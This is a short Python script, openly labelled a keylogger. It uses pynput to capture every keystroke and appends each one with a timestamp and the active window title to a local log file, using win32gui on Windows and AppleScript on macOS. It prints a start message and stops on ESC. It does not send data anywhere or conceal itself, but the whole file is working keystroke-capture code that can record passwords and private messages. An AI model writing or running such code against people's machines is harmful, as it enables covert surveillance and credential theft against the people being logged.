```python
from pynput import keyboard
from datetime import datetime
import os
import platform
import subprocess

# Log file location
LOG_FILE = "keylog_with_apps.txt"

# Track last window title to avoid repeating
last_window = None

# Get active window title (cross-platform)
def get_active_window_title():
    current_os = platform.system()
    
    if current_os == "Windows":
        try:
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except ImportError:
            return "Window: [win32gui not installed]"
    
    elif current_os == "Darwin":  # macOS
        try:
            script = 'tell application "System Events" to get name of (processes where frontmost is true)'
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
            return result.stdout.strip()
        except Exception:
            return "Window: [unknown - AppleScript error]"
    
    else:
        return "Window: [Unsupported OS]"

# On key press event
def on_press(key):
    global last_window
    time_now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    
    window_title = get_active_window_title()
    
    with open(LOG_FILE, "a") as f:
        if window_title != last_window:
            f.write(f"\n--- {time_now} | Active Window: {window_title} ---\n")
            last_window = window_title
        
        f.write(f"{time_now} | {key_str}\n")
    
    print(f"{time_now} | {window_title} | {key_str}")

# On key release
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Start keylogger
def main():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
```
